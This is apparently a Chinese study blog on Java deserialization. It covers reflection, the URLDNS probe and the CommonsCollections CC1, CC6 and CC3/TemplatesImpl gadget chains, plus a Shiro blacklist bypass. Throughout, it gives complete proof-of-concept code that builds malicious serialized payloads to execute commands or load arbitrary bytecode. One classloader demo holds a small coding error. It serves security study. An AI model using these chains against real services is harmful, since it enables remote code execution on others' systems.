---
title: Java 反序列化入门
date: 2022-04-05 16:11:53
excerpt: 主要涉及反序列化原理以及几条CC链，从以前的博客上直接搬运而来
categories:
  - Tech
tags: [Java]
---

## JVM机制

个人简单理解，相对于 C/C++ 等编译型语言，它们直接将代码编译成二进制可执行文件，能够被系统直接识别从而执行文件中的指令，Java则通过类似于虚拟机的JVM方式来调用系统底层函数。JVM 在系统底层实际可以看作一个进程，负责加载编译之后的class字节码文件，读取其中的字节码指令，然后翻译成系统能够识别的指令进行执行。

这里可以看出 Java 的一个特性就是跨平台，只要实现了 JVM，就能运行 Java 程序；同时也能看出 class文件只是一个接口，无论什么语言，只要是能够被编译成 class 文件，同样能够被 JVM 识别并加载（于是效率就跟 C/C++ 拉开了 :< ）。


[深入理解Java虚拟机到底是什么](https://blog.csdn.net/zhangjg_blog/article/details/20380971)

[深入理解Java Class文件格式（系列）](https://blog.csdn.net/zhangjg_blog/article/details/21486985)

[ClassLoader详解](https://blog.csdn.net/briblue/article/details/54973413)

## Java反射机制


- 获取类的方法： `forName`
- 获取函数的方法： `getMethod`
- 实例化类对象的方法： `newInstance`
- 执行函数的方法： `invoke`



[Java 反射机制](https://blog.csdn.net/qq_44715943/article/details/120587716)

```java
public static void exec(String className, String methodName) throws Exception {
    Class clazz = Class.forName(className);
    clazz.getMethod(methodName).invoke(clazz.newInstance());
}
```

在 JDK9 以后，直接使用 `newInstance()` 会报已被弃用的错误，需要在前面添加`getDeclaredConstructor()`或`getConstructor()`，明确调用的是哪一个构造器从而生成新的实例。

各类构造函数的执行顺序：
![](https://image.silente.top/img/s172.png)
![](https://image.silente.top/img/s173.png)
![](https://image.silente.top/img/s174.png)

而上面的反射并不能调用`private`的构造函数：

```java
public static void exec(String className, String methodName, String cmd) throws Exception {
    Class clazz = Class.forName(className);
    clazz.getMethod(methodName, String.class).invoke(clazz.getDeclaredConstructor().newInstance(), cmd);
}
exec("java.lang.Runtime", "exec", "ls");
```

![](https://image.silente.top/img/s175.png)

但其实`getDeclared`系列能够获取类申明的所有函数(Mehtod)包括构造函数(Construction)，只需要`setAccessible(true)`就能调用私有函数。

```java
Class clazz = Class.forName("java.lang.Runtime");
Constructor constructor = clazz.getDeclaredConstructor();
constructor.setAccessible(true);
clazz.getMethod("exec", String.class).invoke(constructor.newInstance(), cmd);
```

这里当JDK版本是8u77时（本地的8版本就这一个呜呜）能够触发，但是高版本似乎还是会被限制，比如JDK17就报错了 :<

那么还可以调用`getRuntime`获取实例，高版本也能完成触发。

```java
Class clazz = Class.forName("java.lang.Runtime");
clazz.getMethod("exec", String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz), "calc.exe");
```

至于对于父类函数的继承，就懒得进一步研究了，毕竟如果可以打反射，直接打它本身的类不香么；这里给出结论就是通过`getMethod`能够获取父类的所有公开方法。

## Java序列化

### 认识


[Java中序列化实现原理研究](https://blog.csdn.net/weixin_39723544/article/details/80527550)

先简单写一个。
![](https://image.silente.top/img/s176.png)

序列化后的数据流保存在`se.ser`中，这里可以使用下面的工具对序列化后的数据流进行分析：

[SerializationDumper 工具](https://github.com/NickstaDB/SerializationDumper/)

[常量含义查询](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html)

执行` java -jar ./SerializationDumper-v1.13.jar -r ./se.ser > ./se.txt`，逆向就`-f`。

就得到类似于这样的东西：
![](https://image.silente.top/img/s177.png)

使用 winhex 直接打开数据流文件也能看出大概来：
![](https://image.silente.top/img/s178.png)

即 Java 序列化数据流都是以`0xACED`开头的。

### URLDNS

通过一个简单的利用链来看看 Java 反序列化，这里直接翻开 ysoserial 的源码，可以通过注释得到是`HashMap`的`hashCode`方法出了问题。
![](https://image.silente.top/img/s179.png)

先看入口`HashMap`的`readObject`方法：

```java
private void readObject(java.io.ObjectInputStream s)
    throws IOException, ClassNotFoundException {
    // Read in the threshold (ignored), loadfactor, and any hidden stuff
    s.defaultReadObject();
    reinitialize();
    if (loadFactor <= 0 || Float.isNaN(loadFactor))
        throw new InvalidObjectException("Illegal load factor: " +
                                         loadFactor);
    s.readInt();                // Read and ignore number of buckets
    int mappings = s.readInt(); // Read number of mappings (size)
    if (mappings < 0)
        throw new InvalidObjectException("Illegal mappings count: " +
                                         mappings);
    else if (mappings > 0) { // (if zero, use defaults)
        ......
        // Read the keys and values, and put the mappings in the HashMap
        for (int i = 0; i < mappings; i++) {
            @SuppressWarnings("unchecked")
                K key = (K) s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V) s.readObject();
            putVal(hash(key), key, value, false, false);
        }
    }
}
```

在最后调用了`hash()`，跟进：

```java
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```

可以看到执行了类的`hashCode`方法，跟进`URL`类的`hashCode`：

```java
public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;

    hashCode = handler.hashCode(this);
    return hashCode;
}
```

这是计算了`handler`的`hashCode`，是`URLStreamHandler`的实现类，那么继续跟进：

```java
protected int hashCode(URL u) {
    int h = 0;

    // Generate the protocol part.
    String protocol = u.getProtocol();
    if (protocol != null)
        h += protocol.hashCode();

    // Generate the host part.
    InetAddress addr = getHostAddress(u);
    ......
}
```

有一个`getHostAddress`方法：

```java
protected synchronized InetAddress getHostAddress(URL u) {
    if (u.hostAddress != null)
        return u.hostAddress;

    String host = u.getHost();
    if (host == null || host.equals("")) {
        return null;
    } else {
        try {
            u.hostAddress = InetAddress.getByName(host);
        } catch (UnknownHostException ex) {
            return null;
        } catch (SecurityException se) {
            return null;
        }
    }
    return u.hostAddress;
}
```

这里有个`InetAddress.getByName(host)`就是做了一次DNS解析查询。

触发链就是：`HashMap::readObject -> HashMap::hash -> URL::hashCode -> URLStreamHandler::hashCode -> URLStreamHandler::getHostAddress -> InetAddress::getByName`；这里还要注意的是因为是反序列化触发，如果正常反序列化，类的`hashCode`已经被计算出来了所以不会再计算，因此需要在生成序列化的时候将`hashCode`修改为`-1`，而当该字段值为其他的时候，就不会触发DNS，这个特性能用在生成payload上。

手写的payload如下：

```java
HashMap<URL, String> hashMap = new HashMap<>();
URL url = new URL("http://6zec98.dnslog.cn");
Class<?> clazz = Class.forName("java.net.URL");
Field f = clazz.getDeclaredField("hashCode");
f.setAccessible(true);
f.set(url, 0xffff);
hashMap.put(url,"SilentE");
f.set(url,-1);
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("attack.ser"));
oos.writeObject(hashMap);
oos.close();

ObjectInputStream ois = new ObjectInputStream(new FileInputStream("attack.ser"));
ois.readObject();
```

当然序列化数据流也能直接用`java -jar ysoserial.jar URLDNS "http://xxx" > attack.ser`生成；这里有个小坑就是最开始在win下生成，可能是编码问题造成的数据流出错emmm：
![](https://image.silente.top/img/s180.png)

怎么这么像 UTF-16 呢。。。然后在 linux 下什么事也没有。

### CC1

研究环境为 jdk8u_66 < 71

```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

CC链1的原理是利用了`TransformerMap`对`Map`类的修饰，从而通过回调执行命令。

P神给出的 example：

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.getRuntime()),
        new InvokerTransformer("exec",
                new Class[] {String.class},
                new Object[] {"calc"}
         )
};
Transformer transformerChain = new ChainedTransformer(transformers);
Map<?, ?> innerMap = new HashMap<>();
Map<String, String> outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
outerMap.put("name", "SilentE");
```

`Transformer`是一个接口，定义了必须实现的`transform`方法；`ConstantTransformer`被用来返回一个对象实例；`InvokerTransformer`被用来执行一个方法：
![](https://image.silente.top/img/s181.png)

`ChainedTransformer`则被用来进行`Transformer`的链式构造，即上一个`Transformer`的结果作为下一个`Transformer`的参数。

`Map<String, String> outerMap = TransformedMap.decorate(innerMap, null, transformerChain)`，就相当于给`innnerMap`添加了一个装饰器，在使用`outerMap`增加元素时会调用挂在上面的`transformerChain`，从而造成命令执行。

在反序列化中，如果有类的`readObject`方法也进行了增添元素类似的操作，那么就能够被我们所利用，`sun.reflect.annotation.AnnotationInvocationHandler`完美符合要求：
![](https://image.silente.top/img/s182.png)

写出序列化执行部分：

```java
public static void doIt(Map outerMap) throws Exception {
    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
    constructor.setAccessible(true);
    Object obj = constructor.newInstance(Target.class, outerMap);

    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("attack.ser"));
    oos.writeObject(obj);
    oos.close();

    ObjectInputStream ois = new ObjectInputStream(new FileInputStream("attack.ser"));
    ois.readObject();
}
```

翻开`AnnotationInvocationHandler`的初始化可以看出`AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2){}`，第一个参数有一个限制就是需要继承`Annotation`接口，随便在 idea 搜一搜就有很多。

执行但会发现出现了报错：
![](https://image.silente.top/img/s183.png)

原因是`java.lang.Runtime`对象并没有实现序列化接口，不能序列化；所以这里可以使用反射来获取`java.lang.Class`对象进而实现序列化，只需要对`transformerChain`进行改动：

![](https://image.silente.top/img/s184.png)

然后你会发现运行没有报错了，但似乎并没有弹出计算器 :<

进行动调发现是在`readObject`方法中并没有走到`setValue`这一步，原因在于`var7==null`。

往前看看会发现在之前，会把注解类的方法名和返回类型存进`var3`作为一组`key-value`，然后会提取出传入`Map`的`key`，通过在`var3`中`get`的方式找到对应的返回类，作为`var7`，那么不让它为`null`显然就可以查看注解类中的方法名，把之前构造的键对值中的`key`换成这个方法名就可。例如`Target.class or Retention.class`中的`value`方法。

![](https://image.silente.top/img/s185.png)

然后就会看到心心念的计算器 :>

在 ysoserial 中是使用的`LazyMap`，略微有点不一样。思路同样是调用`transformerChain`，但`LazyMap`是通过`AnnotationInvocationHandler::invoke->LazyMap::get`的方式触发，那么如何触发`invoke`呢，这里是利用了 Java 的动态代理机制，`AnnotationInvocationHandler`继承了`InvocationHandler`，就是一个代理类的`handler`，使用`Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);`就能完成代理的注入，即在对代理类操作之前，就会执行`AnnotationInvocationHandler::invoke`方法。

测试代码：

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod",
                new Class[] {String.class, Class[].class},
                new Object[]{ "getRuntime", new Class[0]}
        ),
        new InvokerTransformer("invoke",
                new Class[] {Object.class, Object[].class},
                new Object[] {null, new Object[0]}
        ),
        new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[] {"calc"}
        ),
};
Transformer transformerChain = new ChainedTransformer(transformers);
Map<Object, Object> innerMap = new HashMap<>();
innerMap.put("value", "xxxx");
Map outerMap = LazyMap.decorate(innerMap, transformerChain);
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, outerMap);
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);

ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("attack.ser"));
oos.writeObject(handler);
oos.close();

ObjectInputStream ois = new ObjectInputStream(new FileInputStream("attack.ser"));
ois.readObject();
ois.close();
```

同样能够弹出计算器，动调会发现是在这个位置走进了`LazyMap::get`：
![](https://image.silente.top/img/s187.png)

但在大于71的版本上这俩POC均会失效，来试着用`LazyMap`这一款来打打高版本`8u77`：
![](https://image.silente.top/img/s188.png)

`readObject`中并没有直接调用`this.memberValues`，而是新开了一个`Map`对象直接读取字段内容，从而导致之前构造的代理对象并没有在这里发挥作用，因此不能触发代理逻辑；后面又开了一个`LinkedHashMap`，导致整个代码逻辑发生了变化，CC1也就不能进行有效利用。


[readObject'的diff](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d)

### CC6

CC6 是接着 CC1 在高版本下的利用，这里的研究环境是 jdk8u77。

CC1 中的`LazyMap`系列，是调用了`LazyMap::get`从而触发`transformChain`，本地测试时，由于需要让`Map`里不能含有获取的`Key`，所以直接`map.put`并不能触发，通过 idea 搜索关键字找到了一个本地利用点`com.sun.javafx.fxml.expression::get`：
![](https://image.silente.top/img/s189.png)

由于它是抽象类，所以得改成`LiteralExpression`再写POC：

![](https://image.silente.top/img/s191.png)

虽然我本地找到的这个利用点没有反序列化入口，但也揭示了对于高版本的解决思路就是寻找其他路子有无可能触发`LazyMap::get`。

P神给出的是：
`HashMap::readObject->HashMap::hash->TiedMapEntry::hashCode->TiedMapEntry::getValue->LazyMap::get`

首先是`LazyMap`的构造：

```java
Transformer[] fakeTransformers = new Transformer[] {
        new ConstantTransformer(1)
};
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod",
                new Class[] { String.class, Class[].class },
                new Object[] { "getRuntime", new Class[0] }
        ),
        new InvokerTransformer("invoke",
                new Class[] {Object.class, Object[].class },
                new Object[] { null, new Object[0] }
        ),
        new InvokerTransformer("exec",
                new Class[] { String.class },
                new String[] { "calc.exe" }
        ),
        new ConstantTransformer(1),
};
Transformer transformerChain = new ChainedTransformer(transformers);
Map<Object, Object> innerMap = new HashMap<>();
Map outerMap = LazyMap.decorate(innerMap, transformerChain);
```

这里利用了`fakeTransformers`先填入`outerMap`中占位，防止在生成POC的过程中触发，最后可以通过获取字段替换成真正的`transformers`达成恶意POC；而这里的`ConstantTransformer(1)`我觉得是为了防止奇奇怪怪的错误，如果没有加的话，会出现`NoSerialzableException`：

![](https://image.silente.top/img/s192.png)

然后是`TiedMapEntry`构造：

```java
TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "value");
Map hashMap = new HashMap();
hashMap.put(tiedMapEntry, "foo");
```

这里一个要注意的点是当直接使用真正的`transformers`生成POC时会在`HashMap.put`方法触发，并且会在`hashMap`中添加一个值为`value`的`key`所以会导致后续POC不能触发，所以在`put`后需要`remove`掉`value`。

完整 POC：

```java
//LazyMap构造
Transformer[] fakeTransformers = new Transformer[] {
        new ConstantTransformer(1)
};
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod",
                new Class[] { String.class, Class[].class },
                new Object[] { "getRuntime", new Class[0] }
        ),
        new InvokerTransformer("invoke",
                new Class[] {Object.class, Object[].class },
                new Object[] { null, new Object[0] }
        ),
        new InvokerTransformer("exec",
                new Class[] { String.class },
                new String[] { "calc.exe" }
        ),
        new ConstantTransformer(1),
};
Transformer transformerChain = new ChainedTransformer(fakeTransformers);
Map<Object, Object> innerMap = new HashMap<>();
Map outerMap = LazyMap.decorate(innerMap, transformerChain);

//TiedMapEntry & HashMap 构造
TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "value");
HashMap hashMap = new HashMap();
hashMap.put(tiedMapEntry, "foo");
outerMap.remove("value");

Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
f.setAccessible(true);
f.set(transformerChain, transformers);

ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("attack.ser"));
oos.writeObject(hashMap);
oos.close();

ObjectInputStream ois = new ObjectInputStream(new FileInputStream("attack.ser"));
ois.readObject();
ois.close();
```

ysoserial 上的链子是`HashSet::readObject->HashMap::put->HashMap::hash->TiedMapEntry::hashCode->TiedMapEntry::getValue->LazyMap::get`，大概也是类似的思路。

CC1和CC6的整套流程都是跟着P神走着，中间加入了一点自己的思考与探索，收获还是有的，只是感觉这 Java 反序列化还没入门呢 :<

哦这里有个[源码网站](http://hg.openjdk.java.net/)，可以从上面下源码再在 idea 导入库从而实现源码调试。

### CCx

#### ClassLoader 认知

这篇文章写的很明白了：

[一文看懂ClassLoader](https://blog.csdn.net/briblue/article/details/54973413)

梳理一下，一个`Class`文件被注册进 JVM 中可能会经历 `Classloader#loadClass`、`ClassLoader#findClass`、`ClassLoader#defineClass`三个阶段，其中在`loadClass`中是利用了双亲委派机制进行加载。

可以写个自建`ClassLoader`的小 demo （只实现了`findClass`方法）:

```java
package com.example.lab1;

public class Main {
    public void neko() {
        System.out.println("SilentE is handsome!!!!!");
    }
}
```

生成`Main.class`；自己写的`ClassLoader`：

```java
package com.example.lab1;

import java.io.*;

public class MyClassloader extends ClassLoader {
    private String classPath;
    public MyClassloader(String path) {
        this.classPath = path;
    }

    @Override
    protected Class<?> findClass(String fileName) throws ClassNotFoundException {
        File file = new File(classPath, fileName);
        try {
            FileInputStream fis = new FileInputStream(file);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            int b = 0;
            while ((b = fis.read()) != -1) {
                bos.write(b);
            }
            byte[] data = bos.toByteArray();
            fis.close();
            bos.close();
            return defineClass(name, data, 0, data.length);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return super.findClass(name);
    }
}

```

测试：

```java
package com.example.lab1;

import java.lang.reflect.Method;

public class ClassLoaderTest {
    public static void main(String[] args) {
        MyClassloader myClassloader = new MyClassloader("E:\\JavaLearn");
        try {
            Class clazz = myClassloader.loadClass("com.example.lab1.Main.class");
            clazz.newInstance();
            Object obj = clazz.newInstance();
            Method method = clazz.getDeclaredMethod("neko");
            method.invoke(obj, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

最终是由`defineClass`的`native`方法将字节码注入 JVM 中。

把这个步骤拿出来，继续写个 demo 来认识一下。先写个`Class`文件，然后把它处理成字节码（或者b64编码）：

```java
//Main.class
package com.example.lab1;
public class Main {
    public Main() {
        System.out.println("construction");
    }
    public void neko() {
        System.out.println("SilentE is handsome!!!!!");
    }
}

//Utils
public static void main(String[] args) {
    String fileName = "E:\\JavaLearn\\Main.class";
    File file = new File(fileName);
    String bCode = Base64.encode(file);
    System.out.println(bCode);
}
```

然后测试：

```java
public static void main(String[] args) throws Exception {
    Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
    defineClass.setAccessible(true);
    byte[] code = Base64.decode("{Base64Code}");
    Class clazz = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), "com.example.lab1.Main", code, 0, code.length);
    clazz.newInstance();
}
```

#### TemplatesImp引入

可以发现 ysoserial 中许多链都有`TemplatesImp`的身影：
![](https://image.silente.top/img/s202.png)

原因主要在于其内部类`TransletClassLoader`有一个作用域为`default`的`defineClass`方法，并且之前的调用都是`public`，能够达成利用目的，从而执行任意字节码。

先在本地测试写一个利用类

```java
public class MyTemplatesImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator,
                          SerializationHandler handler) throws TransletException {
    }
    public MyTemplatesImpl() throws Exception {
        super();
        Runtime.getRuntime().exec("calc");
        System.out.println("SilentE!");
    }
}
```

生成 b64 后测试：

```java
public static void main(String[] args) throws Exception {
    byte[] code = Base64.decode("{b64Code}");
    TemplatesImpl obj = new TemplatesImpl();
    setFieldValue(obj, "_bytecodes", new byte[][] {code});
    setFieldValue(obj, "_name", "MylatesImpl");
    setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
    obj.newTransformer();
}
```

![](https://image.silente.top/img/s203.png)

如何加入反序列化利用呢？可以看见最后是触发了`newTransformer`方法，因此考虑跟`transformers`结合，这里就直接接上 CC6 的链子：

```java
public static void main(String[] args) throws Exception {
    byte[] code = Base64.decode("{b64Code}");
    TemplatesImpl obj = new TemplatesImpl();
    setFieldValue(obj, "_bytecodes", new byte[][] {code});
    setFieldValue(obj, "_name", "MylatesImpl");
    setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

    Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(obj),
            new InvokerTransformer("newTransformer", null, null)
    };
    Transformer transformerChain = new ChainedTransformer(transformers);
    Map<Object, Object> innerMap = new HashMap<>();
    Map outerMap = LazyMap.decorate(innerMap, transformerChain);

    //TiedMapEntry & HashMap 构造
    TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "value");
    HashMap hashMap = new HashMap();
    hashMap.put(tiedMapEntry, "foo");
    outerMap.remove("value");

    Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
    f.setAccessible(true);
    f.set(transformerChain, transformers);

    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("attack.ser"));
    oos.writeObject(hashMap);
    oos.close();

    ObjectInputStream ois = new ObjectInputStream(new FileInputStream("attack.ser"));
    ois.readObject();
    ois.close();
}

public static void setFieldValue(Object obj, String name, Object value)throws Exception {
    Field f = obj.getClass().getDeclaredField(name);
    f.setAccessible(true);
    f.set(obj, value);
}
```

从而使之前写的两个CC链能够执行任意字节码文件。

在 ysoserial 的 CC3 中，实现了对于`InvokerTransformer`的绕过，发现能够利用`TrAXFilter`类的构造函数直接调用`newTransformer`方法：

![](https://image.silente.top/img/s204.png)

那么只需要用`InstantiateTransformer`调用`TrAXFilter`的构造函数生成新实例就能达成利用目的；对于修改仅需替换构造链：

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer (
                new Class[] {Templates.class},
                new Object[] {obj}
        )
};
```

![](https://image.silente.top/img/s205.png)

在ysoserial 中，它的 CC3 后面部分是用的 CC1 中的代理注入，一样的实现效果，因此不能用来打高版本；CC2 则利用了 `cc4.0`包中将`TransformingComparator`这一个类实现了`Serializable`，在其`compare`中触发了`transform`方法，所以可以利用优先队列`PriorityQueue`来进行构造从而绕过使用 CC1 的代理类，使 POC 能在高版本触发；CC4 对于 CC2 不同的地方在于 CC2 是利用 `InvokerTransformer`调用了`newTransformer`方法，而 CC4 则是利用前面的`TrAXFilter.class`的形式对`InvokerTransformer`进行了绕过。

#### Shiro变种

有次学长出了一个题是`shiro`链并且把`ConstantTransformer`和`InvokerTransformer`加入了黑名单。

可以用前面的链子做点改动就能实现，因为`shiro`链不支持加载数组，所以得让`Transformer`数组消失；这里可以考虑把`TrAXFilter.class`放在`TiedMapEntry`的`key`位置，使在`LazyMap#get`方法下直接传入进`TrAXFilter.class`，扮演了`ConstantTransformer`的角色，从而避免了对它的直接使用。

```java
Transformer fakeTransformer = new ConstantTransformer(1);
Transformer transformer = new InstantiateTransformer(
        new Class[]{Templates.class},
        new Object[]{obj}
);

Map<Object, Object> innerMap = new HashMap<>();
Map outerMap = LazyMap.decorate(innerMap, fakeTransformer);

TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, TrAXFilter.class);
HashMap hashMap = new HashMap();
hashMap.put(tiedMapEntry, "foo");
outerMap.remove(TrAXFilter.class);

setFieldValue(outerMap, "factory", transformer);
```

网上冲浪还找到一个师傅的绕过思路，虽然对于这题没法使用，但思路难道不是越多越好吗 :> 即把前面的`ConstantTransformer`换成`MapTransformer`，拼接一下就可以构造了。

```java
Map hashmap = new HashMap();
hashmap.put("keykey", TrAXFilter.class);
Transformer maptransformer = MapTransformer.getInstance(hashmap);
Transformer[] fakeTransformer = new Transformer[] {};
Transformer[] transformers = new Transformer[]{
    maptransformer,
    new InstantiateTransformer(new Class[]{Templates.class}, new Object[] {templates})
};
```



